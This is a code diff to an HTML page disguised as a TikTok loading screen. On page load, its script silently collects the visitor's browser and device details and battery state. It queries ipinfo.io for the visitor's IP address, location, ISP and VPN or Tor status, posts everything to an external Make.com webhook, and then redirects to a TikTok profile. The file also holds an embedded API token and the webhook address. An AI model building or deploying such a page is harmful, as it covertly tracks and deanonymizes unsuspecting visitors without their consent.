@@ -1,4 +1,4 @@
-  <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -14,7 +14,6 @@
       background: #fff;
       color: #000;
     }
-
     .tiktok-container {
       display: flex;
       flex-direction: column;
@@ -24,7 +23,6 @@
       box-sizing: border-box;
       justify-content: center;
     }
-
     .logo {
       width: 80px;
       height: 80px;
@@ -33,19 +31,16 @@
       animation: float 2s ease-in-out infinite;
       margin-bottom: 10px;
     }
-
     .brand-name {
       font-size: 24px;
       color: #000;
       margin-bottom: 20px;
     }
-
     .loading-text {
       font-size: 18px;
       color: #333;
       margin-bottom: 20px;
     }
-
     .spinner {
       border: 4px solid #f3f3f3;
       border-top: 4px solid #ff0050;
@@ -55,19 +50,16 @@
       animation: spin 1s linear infinite;
       margin-bottom: 20px;
     }
-
     .sub-text {
       color: #888;
       font-size: 14px;
       text-align: center;
       max-width: 300px;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
     @keyframes float {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-8px); }
@@ -86,14 +78,8 @@
   <script>
     async function collectData() {
       const now = new Date();
-    const localTime = `${now.getFullYear()}-${now.getMonth() + 1}-${now.getDate()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;  {
-        year: "numeric",
-        month: "2-digit",
-        day: "2-digit",
-        hour: "2-digit",
-        minute: "2-digit",
-        second: "2-digit",
-        hour12: true
+      const localTime = now.toLocaleString("en-US", {
+        timeZoneName: "short"
       });
 
       const userData = {
@@ -112,7 +98,7 @@
         localStorage: !!window.localStorage,
         sessionStorage: !!window.sessionStorage,
         timestamp: now.toISOString(),
-        localTime: localTime,
+        localTime: localTime
       };
 
       if (navigator.connection) {
@@ -133,16 +119,14 @@
         userData.touchSupport = navigator.maxTouchPoints > 0;
       }
 
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          userData.batteryLevel = Math.round(battery.level * 100) + "%";
-          userData.isCharging = battery.charging;
-        } catch (err) {}
-      }
+      try {
+        const battery = await navigator.getBattery();
+        userData.batteryLevel = Math.round(battery.level * 100) + "%";
+        userData.isCharging = battery.charging;
+      } catch (e) {}
 
       try {
-        const ipRes = await fetch('https://ipinfo.io/json?token=cb4dd6c6220e6e');
+        const ipRes = await fetch("https://ipinfo.io/json?token=cb4dd6c6220e6e");
         const ipData = await ipRes.json();
         userData.ip = ipData.ip;
         userData.hostname = ipData.hostname;
@@ -153,37 +137,29 @@
         userData.org = ipData.org;
         userData.postal = ipData.postal;
         userData.timezone = ipData.timezone;
-        userData.asn = ipData.asn ? ipData.asn.asn : null;
+        userData.asn = ipData.asn?.asn || null;
         userData.vpn = ipData.privacy?.vpn || false;
         userData.proxy = ipData.privacy?.proxy || false;
         userData.tor = ipData.privacy?.tor || false;
       } catch (err) {
-        console.error('IPInfo Error:', err);
+        console.error("IPInfo Error:", err);
       }
 
-      // ✅ إرسال البيانات إلى Make Webhook
+      // ✅ إرسال البيانات
       fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
         method: "POST",
         body: JSON.stringify(userData),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log("✅ Sent to Make:", data);
-      })
-      .catch(error => {
-        console.error("❌ Error sending data:", error);
-      });
-
-      // 🔁 التحويل إلى TikTok بعد 2.5 ثانية
-      setTimeout(() => {
+        headers: { "Content-Type": "application/json" }
+      }).then(() => {
         window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
-      }, 2500);
+      }).catch(error => {
+        console.error("❌ إرسال فشل:", error);
+        window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
+      });
     }
 
     collectData();
   </script>
 </body>
 </html>
+ 
